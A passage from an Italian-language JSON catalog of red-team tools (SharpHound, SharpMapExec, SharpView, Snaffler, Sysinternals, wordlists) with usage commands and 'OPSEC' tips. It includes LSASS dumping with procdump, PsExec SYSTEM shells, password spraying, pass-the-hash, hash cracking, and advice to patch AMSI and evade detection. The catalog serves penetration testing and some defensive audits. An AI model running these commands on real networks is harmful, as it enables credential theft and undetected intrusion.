password del krbtgt non viene cambiata due volte.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Rubeus e pesantemente firmato. L'esecuzione su disco viene bloccata immediatamente. AMSI intercetta le signature in memoria. Harvesting e monitoring generano traffico Kerberos anomalo.</p><p><strong>Impatto operativo:</strong> L'iniezione massiccia di ticket puo sovraccaricare lsass.exe. Il Kerberoasting RC4 e distinguibile dal traffico legittimo AES.</p><p><strong>Mitigazioni:</strong> Usare /tgtdeleg per AES. Preferire execute-assembly. Limitare le richieste TGS per non triggerare Defender for Identity.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "securityassessment-ps1",
    "name": "SecurityAssessment.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script PowerShell per audit automatico della postura di sicurezza Windows/AD, verifica hardening e compliance a best practices.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SecurityAssessment.ps1</strong> è uno script di audit progettato per valutare rapidamente il livello di hardening di workstation e server Windows. A differenza dei tool offensivi, il suo scopo è difensivo o di \"situational awareness\": analizza centinaia di impostazioni di configurazione (GPO, Registry, Audit Policy, Patch level) e le confronta con le best practice di sicurezza (es. CIS Benchmarks, Microsoft Security Baselines), generando un report dettagliato sulle lacune identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Configurazione Sistema:</strong> Verifica lo stato di UAC, AppLocker, BitLocker, Credential Guard e servizi vulnerabili attivi. Controlla le impostazioni di SMB (v1 disabilitato, signing richiesto) e protocolli di rete obsoleti (LLMNR/NBT-NS).</p><p><strong>Audit Policy & Logging:</strong> Analizza se il sistema sta registrando gli eventi critici necessari per la rilevazione di attacchi (es. Command Line Auditing, PowerShell Script Block Logging, Logon Events).</p><p><strong>Account & Privilegi:</strong> Identifica account locali inattivi, membri del gruppo Administrators locale e configurazioni dei diritti utente (User Rights Assignment) che deviano dai valori sicuri.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script da una shell amministrativa. Non richiede installazione.</p><pre><code># Esecuzione standard con generazione report\nPS C:\\> .\\SecurityAssessment.ps1\n\n# Esecuzione con output in cartella specifica\nPS C:\\> .\\SecurityAssessment.ps1 -OutputPath C:\\Audit\\Reports</code></pre><p>Al termine, esaminare il file HTML o CSV generato per prioritizzare le remediation in base alla gravità dei riscontri (Rosso/Giallo/Verde).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Usato dai <strong>Blue Team</strong> per verificare la conformità delle \"Golden Image\" prima del deployment.</p><p>Per i <strong>Penetration Tester</strong>, se si ha accesso fisico o RDP a una macchina, fornisce una lista immediata di vettori di Privilege Escalation locale (es. servizi con path non quotati, AlwaysInstallElevated) e difese mancanti (es. no AV, no EDR).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo script esegue letture massive del registro e WMI. Su sistemi con EDR avanzati, questo comportamento (simile a tool di enumeration offensivi come Seatbelt) potrebbe generare alert.</p><p><strong>Impatto operativo:</strong> Basso, attività di sola lettura.</p><p><strong>Mitigazioni:</strong> Se in contesto Red Team, leggere il codice e lanciare solo funzioni specifiche manualmente invece dell'intero script.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "sharphound-exe",
    "name": "SharpHound.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SpecterOps/SharpHound",
    "desc": "Collector C# per BloodHound: mappa relazioni AD, ACL, sessioni utente e trust per identificare attack path complessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpHound è il componente di raccolta dati (Ingestor) per BloodHound. Scritto in C#, è progettato per interrogare massivamente l'Active Directory ed estrarre le relazioni logiche tra utenti, gruppi, computer e container. I dati raccolti (formattati in JSON) vengono poi importati nel database Neo4j di BloodHound per visualizzare graficamente i percorsi di attacco che permettono di scalare privilegi o muoversi lateralmente nel dominio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Strutturale:</strong> Scarica l'intera struttura del dominio (OU, gruppi, utenti), le relazioni di trust tra domini/foreste e le Group Policy. Utilizza LDAP per query efficienti e minimizzando il traffico.</p><p><strong>Analisi ACL & Sessioni:</strong> La vera potenza risiede nell'enumerare le Access Control List (chi può resettare la password di chi?) e le sessioni attive (dove è loggato l'Admin?). Per le sessioni, interroga i singoli host via RPC/NetBIOS (\"Session Loop\").</p><p><strong>Stealth & Optimization:</strong> Include opzioni per randomizzare i delay, escludere Domain Controller, criptare gli output e usare metodi di raccolta meno invasivi (es. solo DCOnly) per ridurre la visibilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire da una macchina joinata al dominio con un utente qualsiasi. L'opzione <code>-c All</code> è la più comune ma rumorosa.</p><pre><code># Raccolta completa standard\nSharpHound.exe -c All\n\n# Raccolta stealth (solo dati AD, niente connessioni agli host)\nSharpHound.exe -c DCOnly --randomizefilenames --encryptzip\n\n# Loop continuo per mappare sessioni (ogni 30 min per 2 ore)\nSharpHound.exe -c SessionLoop --loopduration 02:00:00 --loopinterval 00:30:00</code></pre><p>Caricare il file <code>.zip</code> generato nell'interfaccia grafica di BloodHound.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>È lo standard industriale per mappare il rischio di <strong>Lateral Movement</strong>. Fondamentale per rispondere a domande come: \"Da questa workstation compromessa, posso arrivare al Domain Admin?\". Utile anche ai difensori per identificare e rimuovere \"Dangerous Rights\" assegnati per errore a gruppi generici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'enumerazione delle sessioni (metodo <code>All</code> o <code>Session</code>) tocca ogni host della rete, generando un \"port scan\" distribuito sulla porta 445 molto rumoroso. Defender for Identity rileva l'enum LDAP massiva.</p><p><strong>Mitigazioni:</strong> Usare <code>-c DCOnly</code> per restare quasi invisibili (solo traffico LDAP verso il DC). Evitare <code>SessionLoop</code> in ambienti monitorati. Eseguire da un IP in whitelist se possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "sharpmapexec",
    "name": "SharpMapExec.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/cube0x0/SharpMapExec",
    "desc": "Porting C# di CrackMapExec per post-exploitation: esegue spraying, check credenziali e comandi WMI/SMB/WinRM nativamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpMapExec è una riscrittura in C# del popolare CrackMapExec (CME). Nasce per offrire le stesse capacità di network sweeping e lateral movement in un formato eseguibile nativo (.NET assembly), ideale per essere eseguito via Cobalt Strike `execute-assembly` o altri C2 framework, bypassando la necessità di proxyare traffico o installare Python/dipendenze sul target compromesso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Living off the Land:</strong> Sfrutta le librerie native di Windows per le comunicazioni di rete, riducendo le dipendenze esterne. Esegue autenticazioni NTLM/Kerberos per validare credenziali su ampi range di IP.</p><p><strong>Esecuzione Comandi:</strong> Supporta diverse strategie di esecuzione remota (WMI, SMB, WinRM) per lanciare payload o comandi di ricognizione su host multipli contemporaneamente.</p><p><strong>Enumerazione:</strong> Raccoglie informazioni vitali come share accessibili, sessioni utente attive, drive mappati e gruppi locali amministrativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi cerca di specchiare quella di CME per facilitare la transizione.</p><pre><code># Password Spraying su subnet\nSharpMapExec.exe smb /targets:192.168.1.0/24 /user:admin /password:pass\n\n# Pass-the-Hash e check privilegi admin\nSharpMapExec.exe wmi /targets:servers.txt /user:admin /ntlm:hash /check\n\n# Esecuzione comando su target multipli\nSharpMapExec.exe winrm /targets:10.0.0.50 /user:user /pass:pass /exec:\"ipconfig /all\"</code></pre><p>Gli argomenti possono essere abbreviati e il tool gestisce output colorato per evidenziare successi (Pwn3d!).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Perfetto per il <strong>Lateral Movement</strong> in scenari dove si opera da un beacon in memoria e non si può usare SOCKS proxy. Permette di \"pivotare\" rapidamente testando le credenziali dumpate contro altri host della rete interna direttamente dalla memoria del processo compromesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Soffre degli stessi problemi di CME: genera picchi di log di autenticazione. Inoltre, essendo un binario .NET non firmato, è soggetto a scansione AMSI al caricamento.</p><p><strong>Mitigazioni:</strong> Usare tramite `execute-assembly` dopo aver disabilitato/patchato AMSI. Evitare scansioni massive; preferire target list mirate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "sharpview",
    "name": "SharpView.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/tevora-threat/SharpView",
    "desc": "Porting .NET di PowerView: enumerazione Active Directory stealth eseguibile via C# per bypassare restrizioni PowerShell.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpView e la reimplementazione in C# del modulo PowerView di PowerSploit, creata per operare in ambienti dove PowerShell e monitorato o limitato. Script Block Logging, Constrained Language Mode e AMSI rendono l'esecuzione di script offensivi rischiosa. SharpView offre le stesse capacita di ricognizione AD (enumerazione utenti, gruppi, trust, ACL, share, GPO) compilate in un assembly .NET caricabile in memoria tramite Cobalt Strike o altri framework C2.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Parita funzionale con PowerView:</strong> Implementa quasi tutti i cmdlet di PowerView con sintassi identica. Get-DomainUser, Get-DomainGroup, Find-LocalAdminAccess, Invoke-ShareFinder e Get-DomainGPO sono disponibili con gli stessi parametri, facilitando la transizione per operatori familiari con PowerView.</p><p><strong>Evasione difese PowerShell:</strong> Essendo un assembly .NET compilato, bypassa Constrained Language Mode e Script Block Logging. Il codice non transita attraverso il motore PowerShell, eliminando una delle superfici di rilevamento piu monitorate.</p><p><strong>Ricognizione AD completa:</strong> Mappa l'intera struttura del dominio: utenti con attributi sensibili, relazioni di trust, ACL permissive, GPO e condivisioni di rete. Fondamentale per pianificare percorsi di privilege escalation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire come binario o caricare in memoria via assembly loader.</p><pre><code># Enumerazione utenti con proprieta specifiche\nSharpView.exe Get-DomainUser -Properties samaccountname,description,memberof\n\n# Ricerca workstation con admin locale\nSharpView.exe Find-LocalAdminAccess\n\n# Enumerazione ACL permissive\nSharpView.exe Get-DomainObjectAcl -Identity \"Domain Admins\" -ResolveGUIDs\n\n# Ricerca share accessibili\nSharpView.exe Invoke-ShareFinder -CheckShareAccess</code></pre><p>I risultati possono essere passati a BloodHound per la visualizzazione grafica dei percorsi di attacco.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Ricognizione in ambienti hardened:</strong> Quando powershell.exe e bloccato o monitorato dal SOC, SharpView permette di continuare la ricognizione del dominio utilizzando processi legittimi per caricare il codice .NET.</p><p><strong>Mappatura percorsi di escalation:</strong> L'enumerazione delle ACL e delle deleghe identifica catene di permessi che portano da utente standard a Domain Admin, informazione critica per pianificare l'escalation senza tentativi a vuoto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico LDAP e RPC verso i DC, analizzabile da Defender for Identity. Query come Invoke-ShareFinder producono connessioni SMB verso molti host, un pattern facilmente rilevabile.</p><p><strong>Impatto operativo:</strong> Enumerazioni estese generano carico sul DC. Find-LocalAdminAccess contatta ogni workstation del dominio, comportamento anomalo per un utente standard.</p><p><strong>Mitigazioni:</strong> Il binario su disco e firmato come hacktool. Eseguire sempre in memoria. Limitare le query a specifiche OU. Distribuire le richieste nel tempo per evitare picchi LDAP sospetti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "snaffler",
    "name": "Snaffler.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SnaffCon/Snaffler",
    "desc": "Scanner avanzato per share SMB che identifica file sensibili (password, chiavi SSH, config) tramite pattern matching e regex.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Snaffler è uno strumento di \"caccia al tesoro\" automatizzata per ambienti Active Directory. Scansiona le share di rete accessibili (SYSVOL, netlogon, file server) alla ricerca di dati sensibili che gli amministratori o gli utenti hanno lasciato incustoditi. Utilizza un motore di regole sofisticato per distinguere tra file spazzatura e vere credenziali, chiavi private, backup di database o file di configurazione con password in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery Intelligente:</strong> Non si limita a cercare nomi di file. Ispeziona il contenuto dei file (fino a una certa dimensione) cercando pattern regex di credenziali, stringhe di connessione SQL, token API e altro.</p><p><strong>Riduzione Rumore:</strong> Il suo punto di forza è la capacità di scartare falsi positivi (es. file .xml di esempio) e classificare i ritrovamenti per livello di gravità (Nero, Rosso, Giallo, Verde), permettendo al pentester di focalizzarsi solo sui dati critici.</p><p><strong>Velocità:</strong> Fortemente multithreaded, può processare terabyte di dati distribuiti su centinaia di share in tempi ridotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede di essere eseguito da un utente di dominio. L'output a video è molto verboso, quindi è essenziale loggare su file.</p><pre><code># Scansione standard (molto rumorosa a video)\nSnaffler.exe -s -o risultati.log\n\n# Scansione mirata su computer specifici con output dettagliato\nSnaffler.exe -n -i computers.txt -o snaffler.log -v data\n\n# Analisi dei risultati (live triage)\nGet-Content snaffler.log -Wait | Select-String \"^(\\{Black\\}|\\{Red\\})\"</code></pre><p>Le tag <code>{Black}</code> indicano ritrovamenti critici certi (es. file id_rsa senza password), <code>{Red}</code> alta probabilità di credenziali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong>, spesso fornisce la chiave per il dominio (es. un file <code>web.config</code> con password di sa o un backup di AD). In fase di <strong>Audit/Cleanup</strong>, aiuta le aziende a identificare e rimuovere dati sensibili esposti a tutti gli utenti del dominio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un traffico SMB di lettura massivo. Può saturare la banda se non limitato. I sistemi DLP o di monitoraggio file server noteranno l'accesso a migliaia di file in breve tempo.</p><p><strong>Impatto operativo:</strong> Alto consumo di IOPS sui file server.</p><p><strong>Mitigazioni:</strong> Eseguire in orari non lavorativi. Usare opzioni per limitare il numero di thread o escludere share molto grandi/sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "sysinternals-suite",
    "name": "SysinternalsSuite",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite",
    "desc": "Suite ufficiale Microsoft di utility avanzate per troubleshooting, analisi processi, forensics e gestione remota (PsExec, ProcMon, Sysmon).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La Sysinternals Suite è una collezione di oltre 70 utility di sistema create da Mark Russinovich (Microsoft). Sebbene nate per amministrazione e debugging, sono armi a doppio taglio fondamentali sia per attaccanti (per movimento laterale, persistenza e evasione) che per difensori (per analisi forense, monitoraggio e rilevamento malware). Essendo firmate digitalmente da Microsoft, spesso bypassano controlli di whitelisting basilari.</p><br><hr><h4 class=\"rt-purple\">Tool Chiave per Security</h4><p><strong>PsExec:</strong> Lo standard per l'esecuzione remota. Permette di lanciare processi su altri sistemi (via SMB/RPC) con privilegi SYSTEM, usato massivamente per lateral movement.</p><p><strong>ProcDump:</strong> Utility da riga di comando per il monitoraggio dei crash, abusata dagli attaccanti per eseguire il dump della memoria del processo LSASS (<code>lsass.exe</code>) e estrarre credenziali senza usare Mimikatz, spesso evadendo gli AV.</p><p><strong>Sysmon:</strong> Strumento difensivo che installa un driver per loggare attività dettagliate di sistema (creazione processi, connessioni di rete, modifica file) nel registro eventi, essenziale per il threat hunting moderno.</p><p><strong>Autoruns & ProcMon:</strong> Fondamentali per analisi forense statica e dinamica, permettono di individuare meccanismi di persistenza (chiavi di registro, servizi, task) e tracciare l'attività real-time di malware.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La suite è composta da eseguibili standalone portabili.</p><pre><code># PsExec: Shell interattiva remota come SYSTEM\npsexec.exe \\\\192.168.1.50 -u Administrator -p Pass -s cmd.exe\n\n# ProcDump: Dump memoria LSASS (richiede Admin)\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# Sysmon: Installazione con configurazione xml\nsysmon.exe -accepteula -i config.xml</code></pre><p>È possibile usare la versione live web senza download tramite il path UNC: <code>\\\\live.sysinternals.com\\tools\\toolname.exe</code> (se l'accesso internet è permesso).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Teaming</strong>, PsExec è il metodo classico per spostarsi dopo aver ottenuto credenziali admin.</p><p>ProcDump è la tecnica \"Living off the Land\" preferita per il credential harvesting. In <strong>Incident Response</strong>, Process Explorer e Autoruns sono i primi tool lanciati su una macchina sospetta per identificare processi anomali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PsExec lascia tracce evidenti (servizio PSEXESVC, Event ID 7045). ProcDump su LSASS è una firma nota per gli EDR. L'uso di <code>live.sysinternals.com</code> genera traffico WebDAV sospetto in uscita.</p><p><strong>Mitigazioni:</strong> Rinominare gli eseguibili (es. <code>pd.exe</code> per ProcDump). Usare varianti di PsExec (come quello di Impacket o CS) che offrono più controllo. Non eseguire mai tool direttamente dal web server Microsoft in un engagement stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "wordlist-paroleitaliane",
    "name": "Parole Italiane",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/napolux/paroleitaliane",
    "desc": "Collezione di wordlist mirate per l'Italia: nomi, cognomi, città e termini comuni per password spraying efficace.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Parole Italiane e una raccolta curata di dizionari e wordlist ottimizzati per target italiani. A differenza di wordlist internazionali come RockYou che contengono prevalentemente termini anglofoni, questa collezione include nomi propri italiani, cognomi diffusi, citta, regioni, squadre di calcio, termini dialettali e parole comuni della lingua italiana. La specificita culturale e fondamentale: la maggioranza delle password in contesti aziendali italiani si basa su pattern prevedibili legati alla cultura locale come nomi di figli, citta di nascita e squadre del cuore seguiti da anno e carattere speciale.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Liste Nomi e Cognomi:</strong> Migliaia di nomi propri e cognomi diffusi in Italia, utili per generare liste di username aziendali (formato nome.cognome, n.cognome) e come base per attacchi a dizionario ibridi dove il nome viene combinato con suffissi numerici e speciali tipici delle policy password.</p><p><strong>Dizionario culturale:</strong> Parole che riflettono la cultura italiana: squadre di Serie A, citta capoluogo, mesi e giorni in italiano. Combinate con regole di mutazione Hashcat, coprono una percentuale alta di password utente reali come \"Juventus2024!\", \"Napoli2023\" o \"Milano01!\".</p><p><strong>Formati compatibili:</strong> Liste in formato testo semplice, una parola per riga, compatibili con qualsiasi tool di cracking o spraying. Facilmente concatenabili, deduplicabili o filtrabili per lunghezza minima.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Input per tool di password cracking, username generation e password spraying.</p><pre><code># Generazione lista username\nusername-anarchy -i nomi.txt cognomi.txt > userlist.txt\n\n# Password cracking con Hashcat e regole di mutazione\nhashcat -m 1000 hashes.txt parole_italiane.txt -r rules/best64.rule\n\n# Cracking con regole avanzate\nhashcat -m 1000 hashes.txt parole_italiane.txt -r rules/dive.rule\n\n# Password Spraying con lista derivata\nspray.sh -smb 192.168.1.0/24 userlist.txt parole_stagione.txt 1 35</code></pre><p>Combinare le parole base con regole che aggiungano anno corrente e caratteri speciali piu comuni (!, @, .).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Red Teaming contro organizzazioni italiane:</strong> Dizionari inglesi contro aziende della PA italiana sono inefficaci. Le wordlist culturalmente mirate aumentano il tasso di successo dal 2-3% con RockYou al 15-20% con liste italiane mutate.</p><p><strong>Generazione username per enumerazione:</strong> Combinare nomi e cognomi con pattern di naming convention italiani genera liste accurate per Kerbrute o OWA spraying.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso per cracking offline non e rilevabile. Per spraying online, rispettare almeno 30 minuti tra tentativi sullo stesso account per evitare lockout.</p><p><strong>Impatto operativo:</strong> Liste grandi con regole aggressive generano centinaia di milioni di candidate, richiedendo tempo significativo anche con GPU moderne.</p><p><strong>Mitigazioni:</strong> Aggiornare con termini recenti (vincitori scudetto, eventi correnti). Integrare con dati specifici del target raccolti durante la fase OSINT.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-payloadsallthethings-4-2",
    "name": "PayloadsAllTheThings",
    "version": "4.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/swisskyrepo/PayloadsAllTheThings",
    "desc": "Repository enciclopedico di payload, bypass, cheat sheet e guide per exploitation web, privilege escalation e metodologie di pentest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PayloadsAllTheThings</strong> non è un singolo eseguibile, ma una risorsa di conoscenza strutturata essenziale per ogni pentester. È un repository che aggrega le tecniche più efficaci, payload di fuzzing, one-liners per reverse shell e guide passo-passo per sfruttare vulnerabilità specifiche (SQLi, XSS, XXE, SSRF, ecc.). Serve come riferimento rapido durante le operazioni per adattare gli attacchi al contesto specifico.</p><br><hr><h4 class=\"rt-purple\">Contenuti principali</h4><p><strong>Web Exploitation:</strong> Liste esaustive di payload per bypassare filtri WAF in attacchi SQL Injection, XSS poliglotti, RCE e Template Injection. Include tecniche per scenari complessi come la deserializzazione insicura in vari linguaggi.</p><p><strong>Methodology & Cheat Sheets:</strong> Guide concise per fasi specifiche: \"Linux Privilege Escalation\", \"Active Directory Methodology\", \"Cloud Hacking\" (AWS, Azure). Offre comandi pronti all'uso per enumerazione ed exploit.</p><p><strong>Intruder Payloads:</strong> Wordlist ottimizzate per l'uso con Burp Suite Intruder, pensate per fuzzare parametri specifici e provocare errori o comportamenti anomali nelle applicazioni target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Questa risorsa si consulta principalmente via browser o clonando la repo localmente per grep rapidi.</p><pre><code># Clonazione per uso offline\ngit clone https://github.com/swisskyrepo/PayloadsAllTheThings.git\n\n# Ricerca rapida di una reverse shell Python\ngrep -r \"python\" PayloadsAllTheThings/Methodology\\ and\\ Resources/Reverse\\ Shell\\ Cheatsheet.md</code></pre><p>I payload vanno copiati e adattati manualmente (es. cambiando IP/Porta o encoding) prima dell'iniezione nel target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando un exploit standard fallisce a causa di un filtro o di una configurazione particolare, PATT fornisce varianti alternative (es. encoding diversi, metodi di concatenazione stringhe) per tentare il bypass. È la risorsa primaria per costruire <strong>fuzzing list customizzate</strong> durante il testing di applicazioni web robuste.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'uso cieco di payload presi da repository pubblici può essere pericoloso (es. payload che fanno crashare il servizio invece di testarlo) o inefficace. Comprendere sempre cosa fa il codice prima di iniettarlo, specialmente in ambienti di produzione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-portswigger",
    "name": "PortSwigger",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/PortSwigger/wordlist-extractor",
    "desc": "Wordlist e utility ecosistema Burp Suite per content discovery, fuzzing parametri e integration con Intruder/Extender",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PortSwigger Wordlists</strong> è una collezione di utility e dizionari integrati nell'ecosistema Burp Suite. Include tool per estrarre/generare wordlist da asset dell'applicazione target e alimentarli direttamente in Burp Intruder ed extensions.</p><br><hr><h4 class=\"rt-purple\">Componenti</h4><p><strong>Wordlist Extractor:</strong> Tool per generare wordlist custom da:</p><ul><li>Response bodies di richieste Burp</li><li>File JavaScript e source maps</li><li>Commenti HTML e metadata</li><li>API responses e strutture JSON</li></ul><p><strong>Built-in wordlists:</strong> Burp Suite include dizionari predefiniti per:</p><ul><li>Username/password comuni</li><li>Directory e filename</li><li>Fuzzing parametri</li><li>Estensioni di file backup</li></ul><br><hr><h4 class=\"rt-green\">Integration Workflow</h4><p><strong>1. Estrazione context-aware:</strong> Durante il proxy browsing, catturare richieste e usare wordlist extractor per generare dizionari basati sulle naming conventions osservate.</p><p><strong>2. Intruder payloads:</strong> Importare wordlist custom in Burp Intruder payload sets per fuzzing mirato di directory, parametri, header.</p><p><strong>3. Content Discovery:</strong> Usare con Burp Scanner o Content Discovery extension per enumerazione di endpoint nascosti.</p><br><hr><h4 class=\"rt-amber\">Casi d'Uso</h4><p><strong>API testing:</strong> Estrarre pattern di endpoint da documentazione Swagger/OpenAPI catturata nel proxy.</p><p><strong>Parameter discovery:</strong> Generare lista parametri da analisi JavaScript per parameter pollution testing.</p><p><strong>Backup file hunting:</strong> Creare wordlist con estensioni e suffissi comuni (.bak, .old, .backup) combinati con filename osservati.</p><br><hr><h4 class=\"rt-red\">Best Practice</h4><p>Combinare wordlist PortSwigger con SecLists per coverage estesa. Usare payload processing rules in Intruder per encoding/encryption on-the-fly. Salvare wordlist generate per riuso su target simili. Integrare con Turbo Intruder extension per high-speed fuzzing su wordlist grandi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-seclists-2025-2",
    "name": "SecLists",
    "version": "2025.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/danielmiessler/SecLists",
    "desc": "La collezione standard de-facto di wordlist per discovery, fuzzing e brute-force: username, password, URL, file sensibili e pattern payload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SecLists</strong> è l'archivio definitivo di liste utilizzate dai security tester. Raccoglie dizionari di password reali (es. RockYou), elenchi di username comuni, percorsi di file e directory per web discovery (es. raft, dirb), payload per fuzzing (XSS, SQLi) e molto altro. È la \"munizione\" per qualsiasi tool di brute-force o discovery automatico come Gobuster, wfuzz, Hydra o Burp Suite.</p><br><hr><h4 class=\"rt-purple\">Categorie principali</h4><p><strong>Discovery:</strong> Liste per enumerazione DNS (sottodomini), Web-Content (directory, file backup, admin panel), e parametri API. Include liste specifiche per tecnologie (CMS, IIS, Apache).</p><p><strong>Passwords & Usernames:</strong> Aggregazioni di leak storici, default credentials per dispositivi/software, e pattern comuni di username per password spraying.</p><p><strong>Fuzzing:</strong> Stringhe progettate per provocare crash o errori in applicazioni (buffer overflow patterns, format strings, caratteri speciali, LFI traversal).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SecLists viene usato come input per altri tool. Solitamente risiede in <code>/usr/share/seclists</code> su Kali/Parrot.</p><pre><code># Web Directory Brute-forcing con Gobuster\ngobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n# Password Spraying con Hydra\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P password123 ssh://192.168.1.1\n\n# Fuzzing API con Wfuzz\nwfuzz -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u http://api.target/FUZZ</code></pre><p>Selezionare la lista giusta per dimensione e contesto è cruciale per il successo e la velocità dell'attacco.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In ogni fase del pentest: dalla <strong>Recon</strong> (trovare sottodomini nascosti) all'<strong>Exploitation</strong> (indovinare credenziali admin o path di file vulnerabili). È essenziale per scoprire risorse non linkate (\"Security by Obscurity\").</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di wordlist grandi genera migliaia di richieste in breve tempo (404 Not Found, 401 Unauthorized), facendo scattare immediatamente WAF, IPS e meccanismi di ban IP.</p><p><strong>Mitigazioni:</strong> Usare liste \"short\" o mirate prima di quelle massiva. Regolare il rate-limit dei tool utilizzati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "cms-wordlists",
    "name": "CMS",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/JavierOlmedo/UltimateCMSWordlists",
    "desc": "Questa è una raccolta di wordlists dei più noti CMS come WordPress, Joomla o Drupal e non solo",
